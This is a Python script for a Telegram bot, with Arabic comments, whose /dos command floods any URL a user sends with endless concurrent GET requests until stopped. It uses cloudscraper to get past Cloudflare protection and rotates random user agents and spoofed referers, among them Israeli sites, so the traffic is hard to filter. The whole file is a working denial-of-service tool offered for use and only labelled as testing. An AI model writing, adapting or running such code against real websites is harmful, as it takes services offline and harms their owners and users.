import threading
import time
import random
import string
from fake_useragent import UserAgent
from cloudscraper import create_scraper
import telebot

# إعدادات البوت
TOKEN = "YOUR_TELEGRAM_BOT_TOKEN"  # استبدل هذا بتوكن البوت الخاص بك
bot = telebot.TeleBot(TOKEN)
ua = UserAgent()

# القوائم المستخدمة
referers = [
    "http://glz.co.il/", "https://www.idf.il/", "https://www.google.com/",
    "https://www.bing.com/", "https://www.yahoo.com/", "https://www.duckduckgo.com/",
    "https://www.reddit.com/", "https://chat.openai.com/", "https://github.com/",
    "https://www.facebook.com/", "https://www.twitter.com/", "https://www.linkedin.com/",
    "https://www.youtube.com/", "https://www.amazon.com/", "https://www.wikipedia.org/",
    "https://www.medium.com/", "https://www.stackoverflow.com/", "https://www.quora.com/",
    "https://www.pinterest.com/", "https://www.tumblr.com/", "https://www.instagram.com/",
    "https://www.netflix.com/", "https://www.microsoft.com/", "https://www.apple.com/",
    "https://www.adobe.com/", "https://www.cloudflare.com/", "https://www.digitalocean.com/",
]

paths = ["/", "/about", "/contact", "/services", "/blog", "/news", "/faq", "/products"]

base_headers = {
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.9",
    "Accept-Encoding": "gzip, deflate, br",
    "Connection": "keep-alive",
    "Cache-Control": "no-cache",
}

# تخزين العمليات الجارية
active_tests = {}

# دالة لتوليد معرف عشوائي
def generate_test_id():
    return ''.join(random.choices(string.ascii_letters + string.digits, k=6))

# دالة إرسال الطلبات
def send_requests(test_id, url):
    local_session = create_scraper()
    while test_id in active_tests and active_tests[test_id]["running"]:
        for _ in range(500):
            try:
                headers = base_headers.copy()
                headers["User-Agent"] = ua.random
                headers["Referer"] = random.choice(referers)
                full_url = url + random.choice(paths)
                local_session.get(full_url, headers=headers, timeout=5)
            except Exception:
                pass
        time.sleep(random.uniform(0.1, 0.5))

# أمر /dos
@bot.message_handler(commands=['dos'])
def dos_command(message):
    args = message.text.split()
    if len(args) != 2:
        bot.reply_to(message, "يرجى إرسال رابط الموقع بعد الأمر. مثال: /dos https://example.com")
        return

    url = args[1]
    if not url.startswith("http"):
        url = "https://" + url

    test_id = generate_test_id()
    active_tests[test_id] = {
        "url": url,
        "running": True,
        "thread": threading.Thread(target=send_requests, args=(test_id, url), daemon=True)
    }
    active_tests[test_id]["thread"].start()

    bot.reply_to(message, f"تم بدء الاختبار على الموقع {url}\nلإيقاف الاختبار، أرسل الأمر: /{test_id}")

# أمر /info
@bot.message_handler(commands=['info'])
def info_command(message):
    if not active_tests:
        bot.send_message(message.chat.id, "لا توجد عمليات اختبار جارية حاليًا.")
        return

    response = "الاختبارات الجارية:\n"
    for test_id, info in active_tests.items():
        response += f"- الموقع: {info['url']} | أمر الإيقاف: /{test_id}\n"
    bot.send_message(message.chat.id, response)

# معالجة أوامر الإيقاف ديناميكيًا
@bot.message_handler(func=lambda message: message.text.startswith('/'))
def stop_test(message):
    test_id = message.text[1:]  # إزالة "/"
    if test_id in active_tests:
        active_tests[test_id]["running"] = False
        del active_tests[test_id]
        bot.send_message(message.chat.id, "تم إيقاف الاختبار بنجاح.")
    elif test_id not in ["dos", "info"]:  # تجاهل الأوامر الأخرى
        bot.send_message(message.chat.id, "لم يتم العثور على اختبار بهذا المعرف.")

# تشغيل البوت
if __name__ == "__main__":
    bot.polling(none_stop=True)
